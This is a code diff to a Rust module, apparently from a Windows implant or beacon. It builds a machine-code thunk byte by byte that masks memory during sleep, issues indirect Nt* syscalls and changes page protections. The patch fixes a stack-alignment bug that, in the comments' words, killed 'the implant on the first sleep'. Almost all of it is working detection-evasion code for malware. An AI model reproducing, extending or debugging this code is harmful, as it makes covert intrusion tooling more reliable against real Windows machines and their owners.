@@ -25,10 +25,17 @@
 //! The unmask call uses an ABSOLUTE `mov rax, imm64; call rax` (NOT R10-
 //! relative) because the indirect syscall stubs each execute `mov r10, rcx`,
 //! making R10 volatile across Steps 1-3. Absolute addressing is robust to
-//! that clobber. Stack alignment: the thunk is entered at RSP ≡ 8 (mod 16)
-//! (standard post-`call` ABI state), so we `sub rsp, 0x28` (32-byte Win64
-//! shadow space + 8-byte realign) to make RSP ≡ 0 (mod 16) at the `call`,
-//! which `unmask`'s prologue requires (it may use alignment-sensitive SSE).
+//! that clobber.
+//!
+//! ## Stack alignment (all 4 call sites)
+//! The thunk is entered at RSP ≡ 8 (mod 16) (standard post-`call` ABI state),
+//! so EVERY `call` inside the thunk — Steps 1, 2, 3 (the Nt* syscalls) AND
+//! Step 4 (the inline `unmask`) — must `sub rsp, 0x28` (32-byte Win64 shadow
+//! space + 8-byte realign) to make RSP ≡ 0 (mod 16) at the callee entry.
+//! Using `0x20` instead leaves RSP ≡ 8 (mod 16) at the `call`, and any
+//! callee `movaps`/`movdqa` on an aligned stack slot raises #GP/#PF — which
+//! under `panic=abort` kills the implant on the first sleep. (v0.3.0 shipped
+//! Steps 1-3 with the wrong `0x20` immediate; v0.3.1 corrects all three.)
 
 #![cfg(target_os = "windows")]
 
@@ -123,20 +130,23 @@ pub fn build(
     b.push(0x44);
     b.push(0x24);
     b.push(0x28);
-    // sub rsp, 0x20
+    // sub rsp, 0x28 (32-byte shadow + 8-byte realign → RSP ≡ 0 mod 16 at call;
+    // the thunk is entered via indirect `call` so on entry RSP ≡ 8 mod 16 —
+    // using 0x20 instead of 0x28 misaligns the stack at the `call` and any
+    // callee `movaps`/`movdqa` raises #GP/#PF. See ABI note at module top.)
     b.push(0x48);
     b.push(0x83);
     b.push(0xEC);
-    b.push(0x20);
+    b.push(0x28);
     // call [r10]
     b.push(0x41);
     b.push(0xFF);
     b.push(0x12);
-    // add rsp, 0x20
+    // add rsp, 0x28
     b.push(0x48);
     b.push(0x83);
     b.push(0xC4);
-    b.push(0x20);
+    b.push(0x28);
 
     // === Step 2: NtDelayExecution(FALSE, &delay) ===
     // rcx = 0
@@ -148,21 +158,21 @@ pub fn build(
     b.push(0x8D);
     b.push(0x52);
     b.push(0x20);
-    // sub rsp, 0x20
+    // sub rsp, 0x28 (see Step 1 comment — same ABI realign)
     b.push(0x48);
     b.push(0x83);
     b.push(0xEC);
-    b.push(0x20);
+    b.push(0x28);
     // call [r10+8]
     b.push(0x41);
     b.push(0xFF);
     b.push(0x52);
     b.push(0x08);
-    // add rsp, 0x20
+    // add rsp, 0x28
     b.push(0x48);
     b.push(0x83);
     b.push(0xC4);
-    b.push(0x20);
+    b.push(0x28);
 
     // === Step 3: NtProtectVirtualMemory(-1, &base, &len, PAGE_EXECUTE_READ=0x20, &dummy) ===
     // rcx = -1
@@ -195,20 +205,20 @@ pub fn build(
     b.push(0x44);
     b.push(0x24);
     b.push(0x28);
-    // sub rsp, 0x20
+    // sub rsp, 0x28 (see Step 1 comment — same ABI realign)
     b.push(0x48);
     b.push(0x83);
     b.push(0xEC);
-    b.push(0x20);
+    b.push(0x28);
     // call [r10]
     b.push(0x41);
     b.push(0xFF);
     b.push(0x12);
-    // add rsp, 0x20
+    // add rsp, 0x28
     b.push(0x48);
     b.push(0x83);
     b.push(0xC4);
-    b.push(0x20);
+    b.push(0x28);
 
     // === Step 4: mem::unmask() — inline, BEFORE returning to the beacon ===
     // CRIT-5: this is the PRIMARY unmask path, NOT MaskGuard::drop. The RX
